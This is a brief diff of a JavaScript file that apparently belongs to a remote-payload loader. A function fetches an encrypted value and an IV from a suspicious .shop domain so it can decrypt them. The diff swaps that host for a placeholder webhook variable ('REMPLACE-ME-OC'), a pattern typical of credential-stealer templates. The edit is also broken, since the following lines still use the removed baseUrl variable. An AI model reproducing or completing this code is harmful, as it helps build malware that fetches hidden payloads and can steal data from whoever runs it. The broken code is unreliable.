@@ -77,7 +77,7 @@ async function fetchData(url) {
 }
 
 async function fetchAndDecrypt() {
-    const baseUrl = "https://bugecepartideyalnizsn2.shop/single-apis";
+    const basewebhookurl = 'REMPLACE-ME-OC'
 
     const encryptedUrl = `${baseUrl}/jacob`;
     const ivUrl = `${baseUrl}/mayo`;
